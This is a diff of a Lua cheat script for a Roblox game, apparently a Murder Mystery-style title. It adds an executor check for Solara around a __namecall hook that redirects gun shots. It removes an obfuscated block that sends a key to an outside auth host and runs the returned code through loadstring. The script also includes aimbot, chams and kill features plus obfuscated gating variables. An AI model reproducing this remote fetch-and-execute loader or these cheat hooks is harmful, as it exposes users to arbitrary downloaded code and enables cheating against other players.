@@ -22,12 +22,6 @@ Switch to dropdowns instead of using "multi kill 1, multi kill 2, etc."
 --------------------------------------------------------------------------------------R3THPRIV----------------------------------------------------------------------------------------
 repeat task.wait() until game:IsLoaded()
 
-if identifyexecutor():find("Krampus") then
-	getgenv().mainKey = "nil"
-
-local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
-return
-end
 if zac5mDuh2AXjsBebYVg6ZSMEf4yxQkw8dRLNGKHF7J9CPT3qWp ~= true then
 	return
 end
@@ -282,6 +276,7 @@ function refreshchams()
 	end
 	roleupdaterfix()
 end
+local solara = identifyexecutor():find("Solara")
 
 function SpawnEmotes()
 	local Remote = game.ReplicatedStorage.Remotes.Extras.GetPlayerData:InvokeServer("GetData")
@@ -493,7 +488,7 @@ getgenv().SheriffAim = false;
 getgenv().GunAccuracy = 25;
 
 local GunHook
-GunHook = hookmetamethod(game, "__namecall", function(self, ...) -------------copy code for shoot player
+if not solara then GunHook = hookmetamethod(game, "__namecall", function(self, ...) -------------copy code for shoot player
 	local method = getnamecallmethod()
 	local args = { ... }
 	if not checkcaller() then
@@ -511,7 +506,7 @@ GunHook = hookmetamethod(game, "__namecall", function(self, ...) -------------co
 		end;
 	end;
 	return GunHook(self, unpack(args));
-end);
+end); end
 
 --------------------------------------------------------------------------------------UNIVERSAL----------------------------------------------------------------------------------------
 if WVryGeXr38ZZtdJWtrBtyeEKdm9Kkweaxm7tnUpuCcH835AQN2aLxV2NeG76kYZuWnCZz4yRr == true then
